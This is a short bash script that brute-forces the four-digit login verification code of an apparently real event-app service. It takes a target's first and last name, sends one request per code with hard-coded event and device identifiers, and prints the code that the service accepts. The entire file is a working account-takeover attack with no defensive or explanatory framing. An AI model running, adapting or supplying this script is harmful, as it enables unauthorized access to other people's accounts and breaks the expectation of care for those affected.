#!/bin/bash
USAGE="USAGE: $0 start end fname lname"

if [[ "$1" != "" ]]; then
	START="$1"
else
	echo $USAGE
	exit 1
fi
if [[ "$2" != "" ]]; then
	END="$2"
else
	echo $USAGE
	exit 1
fi
if [[ "$3" != "" ]]; then
	FNAME="$3"
else
	echo $USAGE
	exit 1
fi
if [[ "$4" != "" ]]; then
	LNAME="$4"
else
	echo $USAGE
	exit 1
fi

for i in `seq $START $END`; do
	n=`printf %04d $i`
	echo "$i"
	output=`curl 'https://svc.crowdcompass.com/login/e/vKx1t90ykc/login/challenges/verification_code' -X PUT -H 'Origin: https://login.crowdcompass.com' -H 'Accept-Encoding: gzip, deflate, sdch, br' -H 'Accept-Language: en-US,en;q=0.8' -H 'User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36' -H 'Content-Type: application/json' -H 'Accept: application/json, text/javascript, */*; q=0.01' -H 'Referer: https://login.crowdcompass.com/login/verification-code' -H 'Connection: keep-alive' -H 'DNT: 1' --data-binary "{\"login_attempt\":{\"event_oid\":\"vKx1t90ykc\",\"authorized_redirect\":\"nx0imepk9nze://authenticate\",\"device\":\"643d9d20-d53f-4fde-b4ca-da3d73bf5393\",\"confirm_base_url\":\"https://svc.crowdcompass.com/vKx1t90ykc/confirm/\",\"answers\":[{\"challenge_id\":\"names\",\"ok\":true,\"first_name\":\"$FNAME\",\"last_name\":\"$LNAME\"},{\"challenge_id\":\"verification_code\",\"verification_code\":\"$n\"}]}}" --compressed 2> /dev/null`
	echo "$output" | grep '"challenge_id":"verification_code","ok":true' &> /dev/null
	if [[ $? -eq 0 ]]; then
		echo "Correct answer was $n"
		echo "Here's the response: $output"
		exit
	fi
done
